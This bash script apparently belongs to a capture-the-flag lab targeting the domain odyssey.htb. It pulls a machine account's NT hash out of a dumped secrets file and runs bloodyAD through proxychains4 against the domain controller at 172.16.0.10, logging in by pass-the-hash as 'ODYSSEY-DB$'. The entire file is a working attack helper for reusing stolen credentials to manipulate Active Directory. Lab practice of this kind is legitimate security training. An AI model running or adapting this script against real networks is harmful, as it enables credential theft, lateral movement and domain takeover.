#!/usr/bin/env bash
set -euo pipefail

source "$(dirname -- "${BASH_SOURCE[0]}")/common.sh"

nt_hash=${ODYSSEY_DB_NT_HASH:-}
secrets_file="$odyssey_root/responses/odyssey-db-secrets.txt"
if [[ -z "$nt_hash" && -f "$secrets_file" ]]; then
  nt_hash=$(sed -n 's/^ODYSSEY\\ODYSSEY-DB\$:aad3b435b51404eeaad3b435b51404ee:\([0-9a-fA-F]\{32\}\):::$/\1/p' "$secrets_file" | head -n 1)
fi
[[ "$nt_hash" =~ ^[0-9a-fA-F]{32}$ ]] || {
  printf 'machine NT hash not found\n' >&2
  exit 1
}

exec proxychains4 -q bloodyAD -s \
  -d odyssey.htb -u 'ODYSSEY-DB$' \
  -p "aad3b435b51404eeaad3b435b51404ee:$nt_hash" \
  -H 172.16.0.10 "$@"
